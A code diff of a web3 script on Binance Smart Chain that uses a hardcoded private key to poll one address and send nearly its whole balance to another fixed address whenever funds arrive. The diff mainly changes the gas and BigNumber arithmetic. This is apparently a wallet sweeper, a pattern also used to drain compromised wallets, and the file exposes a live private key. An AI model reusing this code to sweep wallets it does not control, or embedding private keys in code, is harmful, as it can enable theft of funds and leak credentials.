@@ -19,7 +19,7 @@ const delay_1 = __importDefault(require("delay"));
 var EthereumTx = require('ethereumjs-tx');
 function defaultGasLimit() {
     return __awaiter(this, void 0, void 0, function* () {
-        return '3000000';
+        return '21000';
     });
 }
 function private2Account(web3, privateKey) {
@@ -41,6 +41,7 @@ function main() {
         const pk = '0xced24e91fa4531456b60f9fc01b8041aef9c537cb7f813a0b9ef2f5e81e03fef';
         try {
             const web3 = new web3_1.default(new web3_1.default.providers.HttpProvider(networks_1.networks['bsc']));
+            const toBN = web3.utils.toBN;
             const pubkey = private2Account(web3, pk);
             const gasPrice = yield defaultGasPrice(web3);
             const chainId = yield web3.eth.net.getId();
@@ -49,9 +50,14 @@ function main() {
                 let balance = yield web3.eth.getBalance('0x2B6b9a0981aE5b791eF8EEd84Cd8b20BE365E195');
                 console.log('balance: ', balance.toString());
                 if (balance.toString() !== '0') {
-                    const a = parseInt(balance) - 21000000000000;
+                    const bgbalance = toBN(balance);
+                    const limit = toBN(yield defaultGasLimit());
+                    const subv = limit.mul(toBN(gasPrice));
+                    // console.log('subv: ', subv.toString(10))
+                    let v = bgbalance.sub(subv);
+                    // console.log('left v: ', v.toString(10))
                     const nonce = yield txnonce(web3, pubkey);
-                    const value = web3.utils.toHex(web3.utils.toWei(`${a}`, 'wei'));
+                    const value = web3.utils.toHex(web3.utils.toWei(`${v}`, 'wei'));
                     const txParams = {
                         from: pubkey,
                         to: '0x5A40Ac7dafceCbFAe05D28a85A34b1d131ECB743',
